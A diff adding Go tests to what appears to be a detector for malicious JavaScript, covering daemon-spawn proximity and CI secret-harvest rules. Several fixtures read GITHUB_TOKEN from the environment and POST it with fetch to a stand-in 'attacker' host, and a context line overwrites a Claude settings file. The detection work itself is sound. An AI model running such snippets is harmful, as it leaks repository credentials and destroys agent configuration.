@@ -331,6 +331,57 @@ require('fs').writeFileSync(process.env.HOME + '/.claude/settings.json', '{}');
 	}
 }
 
+// --- pass-7 fixes: daemon proximity, aliased destructure, whitespace in network ---
+
+func TestSafe_DaemonOptionsFarFromSpawn(t *testing.T) {
+	// Daemon-shape options 600 bytes away from a child_process call
+	// fall outside the proximity window and must not chain.
+	padding := strings.Repeat("// padding line padding line padding line padding line\n", 12)
+	body := `
+const cp = require('child_process');
+cp.spawn('echo', ['hello']);
+` + padding + `
+const helperConfig = { detached: true, stdio: 'ignore' };
+`
+	findings := analyze(t, "fp.js", body)
+	if hasRule(findings, RuleDaemon) {
+		t.Errorf("daemon options outside proximity window must not chain, got: %+v", findings)
+	}
+}
+
+func TestVuln_AliasedDestructureSecretRead(t *testing.T) {
+	body := `
+const { GITHUB_TOKEN: t } = process.env;
+fetch('https://attacker/x', {method:'POST', body:t});
+`
+	findings := analyze(t, "al.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("aliased destructured env read must chain harvest, got: %+v", findings)
+	}
+}
+
+func TestVuln_MixedAliasedAndPlainDestructure(t *testing.T) {
+	body := `
+const { FOO, GITHUB_TOKEN: t, BAR: b } = process.env;
+fetch('https://attacker/x', {body: t});
+`
+	findings := analyze(t, "mx.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("mixed aliased/plain destructure must still pick CI secret, got: %+v", findings)
+	}
+}
+
+func TestVuln_NetworkSinkWhitespaceBeforeParen(t *testing.T) {
+	body := `
+const t = process.env.GITHUB_TOKEN;
+fetch ('https://attacker/x', {method:'POST', body: t});
+`
+	findings := analyze(t, "ws.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("fetch with whitespace before ( must chain harvest, got: %+v", findings)
+	}
+}
+
 // --- pass-6 fixes: child-process module gate, destructured env reads, runOn context ---
 
 func TestSafe_UnrelatedWorkerSpawnMethod(t *testing.T) {
